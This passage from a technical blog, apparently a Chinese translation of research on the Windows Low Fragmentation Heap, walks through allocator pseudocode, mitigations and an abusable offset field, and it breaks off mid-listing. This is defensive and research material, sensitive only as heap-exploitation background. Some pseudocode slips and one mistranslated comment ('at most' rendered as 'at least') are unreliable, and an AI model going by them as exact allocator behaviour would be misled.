Unlink检查。这样可以确保FreeList值保持其完整性，以防止在Unlinking时被4字节覆盖所利用。ListsInUseUlong(FreeListInUseBitmap)随后会相应地更新。最后，从链表上卸下来的Chunk会更新头部，转为BUSY态并返回。</p><p style="text-align:center;font-weight:bold">Listing 15. RtlpAllocateHeap ListHint allocation</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//attempt to use the Flink</span></span><br><span class="line"><span class="comment">//试图使用Flink</span></span><br><span class="line"><span class="keyword">if</span>(FreeList != <span class="literal">NULL</span> &amp;&amp; FreeList‐&gt;Flink != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> SizeToUse;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//saved values,保存值</span></span><br><span class="line">    _HEAP_ENTRY *Blink = FreeList‐&gt;Blink;</span><br><span class="line">    _HEAP_ENTRY *Flink = FreeList‐&gt;Flink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the heap chunk header by subtracting 8</span></span><br><span class="line">    <span class="comment">//通过减去8来获取堆头</span></span><br><span class="line">    _HEAP_ENTRY *ChunkToUseHeader = Flink ‐ <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decode the header if applicable</span></span><br><span class="line">    <span class="comment">//解码头部(如果适用)</span></span><br><span class="line">    <span class="keyword">if</span>(Heap‐&gt;EncodeFlagMask)</span><br><span class="line">        DecodeAndValidateChecksum(ChunkToUseHeader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ensure safe unlinking before acquiring this chunk for use</span></span><br><span class="line">    <span class="comment">//在获取该块以供使用之前，确保安全解除链接</span></span><br><span class="line">    <span class="keyword">if</span>(Blink‐&gt;Flink != Flink‐&gt;Blink || Blink‐&gt;Flink != FreeList)</span><br><span class="line">    &#123;</span><br><span class="line">        RtlpLogHeapFailure();</span><br><span class="line">        <span class="comment">//XXX RtlNtStatusToDosError and return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decrement the total heap size</span></span><br><span class="line">    <span class="comment">//减小整体堆大小</span></span><br><span class="line">    Heap‐&gt;TotalFreeSize ‐= ChunkToUseHeader‐&gt;Size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//iterate through the BlocksIndex structures</span></span><br><span class="line">    <span class="comment">//If no sufficient BlocksIndex is found, use BlocksIndex‐&gt;ArraySize ‐ 1</span></span><br><span class="line">    <span class="comment">//迭代BlocksIndex结构体，如果找不到充足的BlocksIndex，就用BlocksIndex‐&gt;ArraySize ‐ 1</span></span><br><span class="line">    _HEAP_LIST_LOOKUP *BlocksIndex = Heap‐&gt;BlocksIndex;</span><br><span class="line">    <span class="keyword">if</span>(BlocksIndex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ListHintIndex = GetListHintIndex(BlocksIndex, Size);</span><br><span class="line">        <span class="keyword">int</span> RelativeOffset = ListHintIndex ‐ BlocksIndex‐&gt;BaseIndex;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//if there are more of the same size，don't update the bitmap</span></span><br><span class="line">        <span class="comment">//如果相同大小的Chunk有很多，就不用更新位图</span></span><br><span class="line">        <span class="keyword">if</span>(Flink‐&gt;Flink != BlocksIndex‐&gt;ListHead &amp;&amp; Flink.Size == Flink‐&gt;Flink.Size)</span><br><span class="line">        &#123;</span><br><span class="line">            BlocksIndex‐&gt;ListHints[FreeListOffset] = Flink‐&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            BlocksIndex‐&gt;ListHints[FreeListOffset] = <span class="literal">NULL</span>;</span><br><span class="line">            BlocksIndex‐&gt;ListsInUseUlong[RelativeOffset &gt;&gt; <span class="number">5</span>] &amp;= ~(<span class="number">1</span> &lt;&lt; RelativeOffset &amp; <span class="number">0x1F</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//unlink the current chunk to be allocated</span></span><br><span class="line">    <span class="comment">//将当前Chunk从FreeList上取下，以待分配</span></span><br><span class="line">    Blink‐&gt;Flink = Flink;</span><br><span class="line">    Flink‐&gt;Blink = Blink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：尽管随后会讨论到，我们还是要注意更新bitmap时不会再使用异或(XOR)操作，取而代之的是使用按位与(&amp;)。这防止了1字节FreeListInUseBitmap翻转攻击(John McDonald/Chris Valasek 2009)。</p></blockquote><p>&emsp;&emsp;如果ListHint无法满足内存分配请求，后端堆管理器就会使用Heap-&gt;FreeLists。FreeLists包含了堆上所有的空闲Chunks。如果一个足够大的Chunk被找到，那么就会在必要时对它进行拆分并返回给用户。否则，堆就需要使用RtlpExtendHeap()来扩展。</p><p style="text-align:center;font-weight:bold">Listing 16. RtlpAllocateHeap Heap-&gt;FreeLists allocation</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//attempt to use the FreeLists</span></span><br><span class="line"><span class="comment">//试图使用FreeLists</span></span><br><span class="line">_LIST_ENTRY *HeapFreeLists = &amp;Heap‐&gt;FreeLists;</span><br><span class="line">_HEAP_LIST_LOOKUP *BlocksIndex = Heap‐&gt;BlocksIndex;</span><br><span class="line">_LIST_ENTRY *ChunkToUse;</span><br><span class="line"></span><br><span class="line"><span class="comment">//find an appropriate chunk on the FreeLists</span></span><br><span class="line"><span class="comment">//在FreeLists上寻找合适的chunk</span></span><br><span class="line">_HEAP_LIST_LOOKUP *CurrBlocksIndex = BlocksIndex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//if we've ran out of structures abort and we'll extend the heap</span></span><br><span class="line">    <span class="comment">//如果搜索完了所有的BlocksIndex结构体还是找不到合适的Chunk，就扩展堆</span></span><br><span class="line">    <span class="keyword">if</span>(CurrBlocksIndex == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ChunkToUse = CurrBlocksIndex‐&gt;ListHead;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//remember that ListHead and HeapFreeLists point to the same location</span></span><br><span class="line">    <span class="comment">//记住ListHead和HeapFreeLists指向同一位置</span></span><br><span class="line">    CurrListHead = CurrBlocksIndex‐&gt;ListHead;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if we've came upon an empty FreeList extend the heap</span></span><br><span class="line">    <span class="comment">//如果我们遇到了一个空的FreeList，就扩展heap</span></span><br><span class="line">    <span class="keyword">if</span>(CurrListHead == CurrListHead‐&gt;Blink)</span><br><span class="line">    &#123;</span><br><span class="line">        ChunkToUse = CurrListHead;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _HEAP_ENTRY *BlinkHeader = (CurrListHead‐&gt;Blink ‐ <span class="number">8</span>);   <span class="comment">//FreeLists中最大的Chunk的头指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//if the chunk is encoded decode it</span></span><br><span class="line">    <span class="comment">//如果该Chunk被编码了，就先解码</span></span><br><span class="line">    <span class="keyword">if</span>(Heap‐&gt;EncodeFlagMask &amp;&amp; Heap‐&gt;EncodeFlagMask &amp; BlinkHeader)</span><br><span class="line">    &#123;</span><br><span class="line">        DecodeHeader(BlinkHeader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if the chunk can't be serviced by the largest chunk extend the heap</span></span><br><span class="line">    <span class="comment">//如果最大的Chunk不能服务，那么就扩展堆</span></span><br><span class="line">    <span class="keyword">if</span>(SizeInBlocks &gt; BlinkHeader‐&gt;Size)</span><br><span class="line">    &#123;</span><br><span class="line">        ChunkToUse = CurrListHead;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _HEAP_ENTRY *FlinkHeader = CurrListHead‐&gt;Flink‐<span class="number">8</span>;   <span class="comment">//FreeLists中最小的Chunk的头指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//if the chunk is encoded decode it</span></span><br><span class="line">    <span class="comment">//如果Chunk被编码了，就先解码</span></span><br><span class="line">    <span class="keyword">if</span>(Heap‐&gt;EncodeFlagMask &amp;&amp; Heap‐&gt;EncodeFlagMask &amp; FlinkHeader)</span><br><span class="line">    &#123;</span><br><span class="line">        DecodeHeader(FlinkHeader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if the first chunk is sufficient use it otherwise loop through the rest</span></span><br><span class="line">    <span class="comment">//如果第一个Chunk的大小是足够的，就使用它，否则继续循环剩余的</span></span><br><span class="line">    <span class="keyword">if</span>(FlinkHeader‐&gt;Size &gt;= SizeInBlocks)</span><br><span class="line">    &#123;</span><br><span class="line">        ChunkToUse = CurrListHead‐&gt;Flink;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//loop through all the BlocksIndex‐&gt;ListHints, looking for a sufficiently sized chunk</span></span><br><span class="line">        <span class="comment">//then update the bitmap accordingly</span></span><br><span class="line">        <span class="comment">//循环所有的BlocksIndex‐&gt;ListHints,寻找一个大小足够的Chunk,然后相应的更新bitmap</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//look at the next BlocksIndex</span></span><br><span class="line">    <span class="comment">//下一个BlocksIndex</span></span><br><span class="line">    CurrBlocksIndex = CurrBlocksIndex‐&gt;ExtendedLookup;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Overview-概览-1"><a href="#Overview-概览-1" class="headerlink" title="Overview(概览)"></a>Overview(概览)</h4><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Back-end_allocation.png" alt="Back-end allocation"></p><p style="text-align:center;font-weight:bold">Diagram 4. Back-end allocation</p><h3 id="Front-end-Allocation-前端分配器"><a href="#Front-end-Allocation-前端分配器" class="headerlink" title="Front-end Allocation(前端分配器)"></a>Front-end Allocation(前端分配器)</h3><p>&emsp;&emsp;现在我们已经看过了LFH是如何通过后端堆管理器的启发式机制来激活的，我们可以看看前端堆管理器使用的分配算法。LFH的设计考虑了性能和可靠性(Marinescu 2006)。为了搞清楚前端分配器的具体工作方式，这些新的增益对逆向工程师来说无疑是巨大的工作量。本节我将尝试阐释一个使用LFH进行分配的典型案例。</p><h4 id="RtlpLowFragHeapAllocFromContext"><a href="#RtlpLowFragHeapAllocFromContext" class="headerlink" title="RtlpLowFragHeapAllocFromContext"></a>RtlpLowFragHeapAllocFromContext</h4><p>&emsp;&emsp;如前所示，RtlpLowFragHeapAllocFromContext()仅仅在ListHint的Blink的0位被置位时才会被调用。按位操作可以判断出Blink是否包含一个HeapBucket，标志着LFH已做好服务该请求的准备。</p><p>&emsp;&emsp;堆管理器的分配一开始需要获取所有的关键数据结构。这包括_HEAP_LOCAL_DATA, _HEAP_LOCAL_SEGMENT_INFO和_HEAP_SUBSEGMENT(可以在图1中看到这些结构的关系)。</p><p>&emsp;&emsp;分配器首先会试图使用Hint SubSegment。如果失败则继续尝试使用ActiveSubsegment。如果ActiveSubsegment也失败了，那么分配器必须为LFH设置适当的数据结构以继续(为了避免冗余，下面的代码仅仅展示了Hint Subsegment使用的伪代码，但其逻辑也可以应用于ActiveSubsegment)。</p><p>&emsp;&emsp;_INTERLOCK_REQ结构被用来获取当前的Depth, Offset和Sequence。这些信息用来获取一个指向当前空闲Chunk的指针，同时也会计算出下一个可用Chunk的Offset。循环逻辑是为了保证关键数据的更新是原子的，不会在操作期间出现其他修改。</p><p style="text-align:center;font-weight:bold">Listing 17. LFH SubSegment allocation</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> LocalDataIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//uses the SizeIndex of the _HEAP_BUCKET to get the address of the LFH for this bucket</span></span><br><span class="line"><span class="comment">//使用_HEAP_BUCKET的SizeIndex来为该bucket获取LFH的地址</span></span><br><span class="line">_LFH_HEAP *LFH = GetLFHFromBucket(HeapBucket);</span><br><span class="line"></span><br><span class="line"><span class="comment">//figure this out yourself :)</span></span><br><span class="line"><span class="comment">//这个请自己研究</span></span><br><span class="line"><span class="keyword">if</span>(HeapBucket‐&gt;Affinity == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    AllocateAndUpdateLocalDataIndex();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get the LocalData and LocalSegmentInfo structures based on Affinity and SizeIndex</span></span><br><span class="line"><span class="comment">//根据Affinity和SizeIndex获取LocalData和LocalSegmentInfo结构</span></span><br><span class="line">_HEAP_LOCAL_DATA *HeapLocalData = LFH‐&gt;LocalData[LocalDataIndex];</span><br><span class="line">_HEAP_LOCAL_SEGMENT_INFO *HeapLocalSegmentInfo = HeapLocalData‐&gt;SegmentInfo[HeapBucket‐&gt;SizeIndex];</span><br><span class="line"></span><br><span class="line"><span class="comment">//try to use the 'Hint' SubSegment first otherwise this would be 'ActiveSubsegment'</span></span><br><span class="line"><span class="comment">//首先尝试使用'Hint' Subsegment,不成再尝试使用'ActiveSubsegment'</span></span><br><span class="line">_HEAP_SUBSEGMENT *SubSeg = HeapLocalSegmentInfo‐&gt;Hint;</span><br><span class="line">_HEAP_SUBSEGMENT *SubSeg_Saved = HeapLocalSegmentInfo‐&gt;Hint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(SubSeg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//get the current AggregateExchange information</span></span><br><span class="line">        <span class="comment">//获取当前的AggregateExchange信息</span></span><br><span class="line">        _INTERLOCK_SEQ *AggrExchg = SubSeg‐&gt;AggregateExchg;</span><br><span class="line">        <span class="keyword">int</span> Offset = AggrExchg‐&gt;FreeEntryOffset;</span><br><span class="line">        <span class="keyword">int</span> Depth = AggrExchg‐&gt;Depth;</span><br><span class="line">        <span class="keyword">int</span> Sequence = AggrExchg‐&gt;Sequence;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//store the old values, to ensure atomic swapping</span></span><br><span class="line">        <span class="comment">//存储旧值，保证原子交换</span></span><br><span class="line">        _INTERLOCK_SEQ AggrExchg_Saved;</span><br><span class="line">        AggrExchg_Saved.OffsetAndDepth = AggrExchg.OffsetAndDepth;</span><br><span class="line">        AggrExchg_Saved.Sequence = Sequence;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//continue only if this is a valid SubSegment</span></span><br><span class="line">        <span class="comment">//仅在是合法的SubSegment情形下才继续</span></span><br><span class="line">        _HEAP_USERDATA_HEADER *UserBlocks = SubSeg‐&gt;UserBlocks;</span><br><span class="line">        <span class="keyword">if</span>(!Depth || !UserBlocks || SubSeg‐&gt;LocalInfo != HeapLocalSegmentInfo)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//this gets the offset from the AggregateExchg(block size) and creates a byte offset</span></span><br><span class="line">        <span class="comment">//从AggregateExchg中获取offset(以blocks为单位)，计算出字节偏移</span></span><br><span class="line">        <span class="keyword">int</span> ByteOffset = Offset * <span class="number">8</span>;</span><br><span class="line">        LFHChunk = UserBlocks + ByteOffset;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//the next offset is store in the 1st 2‐bytes of the userdata (this can probably be abused :))</span></span><br><span class="line">        <span class="comment">//下一个offset存储于用户数据的前两个字节中(这可能会被滥用)</span></span><br><span class="line">        <span class="keyword">short</span> NextOffset = UserBlocks + ByteOffset + <span class="keyword">sizeof</span>(_HEAP_ENTRY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//store the updated offset, depth and sequence</span></span><br><span class="line">        <span class="comment">//存储更新的offset，depth和sequence</span></span><br><span class="line">        <span class="comment">//new_offset = current_offset += BucketSize</span></span><br><span class="line">        <span class="comment">//new_depth = current_deth‐‐</span></span><br><span class="line">        <span class="comment">//new_sequence = depends on current depth</span></span><br><span class="line">        _INTERLOCK_SEQ AggrExchg_New;</span><br><span class="line">        AggrExchg_New.Offset = NextOffset;</span><br><span class="line">        AggrExchg_New.Depth = Depth‐‐;</span><br><span class="line">        <span class="keyword">if</span>(AggrExchg_New.Depth == ‐<span class="number">1</span>)</span><br><span class="line">            AggrExchg_New.Sequence = Sequence‐‐;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            AggrExchg_New.Sequence = Sequence;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//i.e InterLockedCompareExchange</span></span><br><span class="line">        <span class="keyword">if</span>(AtomicSwap(AggrExchg, AggrExchg_New))</span><br><span class="line">        &#123;</span><br><span class="line">            UpdateHeaders(LFHChunk);</span><br><span class="line">            <span class="keyword">return</span> LFHChunk;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            UpdateAffinity();</span><br><span class="line">            SubSeg = SubSeg_Saved;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：尽管出于格式的原因，我们需要清楚RtlpLowFragHeapAllocFromContext()的所有代码都由try/catch块包裹。这是为了处理LFH中失败发生时，可以返回NULL，此后后端分配器会处理分配请求。</p></blockquote><p>&emsp;&emsp;如果Hint和ActiveSubSegment都失败了，无论是因为未初始化还是无效，RtlpLowFragHeapAllocFromContext()都必须通过分配内存，并且将大块的内存分成HeapBin，来获取一个新的SubSegment(使用后端分配器)。一旦这一步完成了，上面的代码就可以通过ActiveSubsegment来服务请求了。</p><p>&emsp;&emsp;如果两种SubSegment都失败了，前端堆就需要分配一个新的内存Chunk。请求的内存量不是任意的，而是基于请求的Chunk的大小以及当前堆上可用的内存总量。下面的伪代码就是我称为Magic Formula(魔法公式)的东西。它将计算需要从后端请求多少内存以便于为一个具体的HeapBucket分割出一个UserBlock:</p><p style="text-align:center;font-weight:bold">Listing 18. LFH UserBlocks allocation size algorithm</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> TotalBlocks = HeapLocalSegmentInfo‐&gt;Counters‐&gt;TotalBlocks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(MaxRunLenReached)</span><br><span class="line">    TotalBlocks = TotalBlocks / <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> BucketAffinity = HeapBucket‐&gt;Affinity &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> BucketBytesSize = RtlpBucketBlockSizes[HeapBucket‐&gt;SizeIndex];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> StartIndex = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(BucketBytesSize &lt; <span class="number">256</span>)</span><br><span class="line">    BucketAffinity‐‐;</span><br><span class="line"><span class="keyword">if</span>(dword_77F97594 &gt; RtlpHeapMaxAffinity &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    BucketAffinity++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> BlockMultiplier = <span class="number">4</span> ‐ BucketAffinity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(TotalBlocks &lt; (<span class="number">1</span> &lt;&lt; BlockMultiplier))</span><br><span class="line">    TotalBlocks = <span class="number">1</span> &lt;&lt; BlockMultiplier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(TotalBlocks &gt; <span class="number">1024</span>)</span><br><span class="line">    TotalBlocks = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//used to calculate cache index and size to allocate</span></span><br><span class="line"><span class="comment">//用于计算要分配的缓存索引和大小</span></span><br><span class="line"><span class="keyword">int</span> TotalBlockSize = TotalBlocks * (BucketBytesSize + <span class="keyword">sizeof</span>(_HEAP_ENTRY)) + <span class="number">0x18</span>l</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(TotalBlockSize &gt; <span class="number">0x78000</span>)</span><br><span class="line">    TotalBlockSize = <span class="number">0x78000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//calculate the cache index upon a cache miss,this index will determine the amount of memory to be allocated</span></span><br><span class="line"><span class="comment">//根据缓存命中计算缓存索引，索引将决定待分配的内存总量</span></span><br><span class="line"><span class="keyword">if</span>(TotalBlockSize &gt;= <span class="number">0x80</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        StartIndex++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(TotalBlockSize &gt;&gt; StartIndex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//we will @ most, only allocate 40 pages (0x1000 bytes per page)</span></span><br><span class="line"><span class="comment">//我们至少要分配40个页(0x1000字节/页)</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">unsigned</span>)StartIndex &gt; <span class="number">0x12</span>)</span><br><span class="line">    StartIndex = <span class="number">0x12</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> UserBlockCacheIndex = StartIndex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(HeapBucket‐&gt;Affinity &amp; <span class="number">6</span>)</span><br><span class="line">    UserBlockCacheIndex = <span class="number">0x12</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//allocate space for a _HEAP_USERDATA_HEADER along with room</span></span><br><span class="line"><span class="comment">//for ((1 &lt;&lt; UserBlockCacheIndex)/BucketBytesSize) heap chunks</span></span><br><span class="line"><span class="comment">//为_HEAP_USERDATA_HEADER和((1 &lt;&lt; UserBlockCacheIndex)/BucketBytesSize)个堆Chunks分配空间</span></span><br><span class="line"><span class="keyword">void</span> *pUserData = RtlpAllocateUserBlock(LFH, UserBlockCacheIndex, BucketByteSize + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">_HEAP_USERDATA_HEADER *UserData = (_HEAP_USERDATA_HEADER*)pUserData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!pUserData)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;上面的代码中的UserBlockCacheIndex变量用作缓存条目数组的索引值。如果缓存丢失，则使用相同的值计算为UserBlocks Chunk分配多少内存。UserBlocks Chunk随后会被拆分成BucketSize Chunks。让我们看看RtlpAllocateUserBlock在不使用缓存项的情况下是如何封装RtlpAllocateHeap的:</p><p style="text-align:center;font-weight:bold">Listing 19. RtlpAllocateUserBlock without caching</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> AllocAmount = <span class="number">1</span> &lt;&lt; 